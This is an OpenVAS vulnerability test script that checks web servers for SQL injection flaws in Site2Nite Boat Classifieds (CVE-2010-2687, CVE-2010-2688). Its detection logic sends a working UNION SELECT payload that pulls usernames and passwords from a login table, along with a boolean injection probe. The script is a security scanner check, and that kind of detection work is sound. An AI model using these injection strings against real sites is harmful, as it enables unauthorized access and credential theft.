###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_site2nite_boat_classifieds_sql_injection_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Site2Nite Boat Classifieds Multiple SQL Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to gain unauthorized access
  and obtain sensitive information.
  Impact Level: Application";
tag_affected = "Site2Nite Boat Classifieds";
tag_insight = "The flaws are caused by improper validation of user-supplied input via the
  'id' parameter in 'detail.asp' and 'printdetail.asp' that allows attackers
  to manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 14th July, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.site2nite.com/boat-webdesign.asp";
tag_summary = "The host is running Site2Nite Boat Classifieds and is prone to SQL
  injection vulnerabilities.";

if(description)
{
  script_id(801378);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-07-16 19:44:55 +0200 (Fri, 16 Jul 2010)");
  script_cve_id("CVE-2010-2687", "CVE-2010-2688");
  script_bugtraq_id(41046, 41059);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Site2Nite Boat Classifieds Multiple SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/65686");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/13990/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/13995/");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/1576");

  script_description(desc);
  script_summary("check Site2Nite Boat Classifieds SQL injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir(make_list("/boat-webdesign", "/products/boat-webdesign/www", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get (item: string (dir,'/detail.asp?ID=999999 union select1,2,3,' +
                  '4,5,username,password,8,9,10,11,12,13,14,15,16,17,18,19,20,' +
                  '21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,' +
                  '41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,' +
                  '61,62,63,64,65,66,67,68,69,70,71,72,73,74from tbllogin "' +
                  'having 1=1--"'), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application and Exploit
  if(('/boat-webdesign/' >< res) && (("DELETE" >< res) ||("SELECT" >< res)))
  {
    security_hole(port:port);
    exit(0);
  }

  req = http_get (item: string (dir,'printdetail.asp?Id=661 and 1=1'), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  # Confirm the application and exploit
  if(('>BOAT DETAILS - Site Id' >< res) && (">Seller Information:<" >< res))
  {
    security_hole(port:port);
    exit(0);
  }
}
